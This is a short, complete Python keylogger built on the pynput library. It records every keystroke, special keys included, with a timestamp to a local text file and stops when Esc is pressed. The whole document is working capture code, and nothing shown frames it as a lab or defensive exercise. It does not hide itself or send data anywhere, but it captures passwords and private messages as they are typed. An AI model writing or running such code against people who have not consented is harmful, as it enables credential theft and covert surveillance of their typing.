from pynput import keyboard
import time

KEYLOGGER_FILE = "recorded_keystrokes.txt"

def on_press(key):
    timestamp = time.strftime('%d/%m/%Y %H:%M:%S')
    with open(KEYLOGGER_FILE, 'a') as f:
        try:
            f.write(f'\n[{timestamp}]: {key.char}')
        except AttributeError:
            f.write(f'\n[{timestamp}]: <{key}>')


def on_release(key):
    if key == keyboard.Key.esc:
        print('\nKeylogger shutting down...')
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()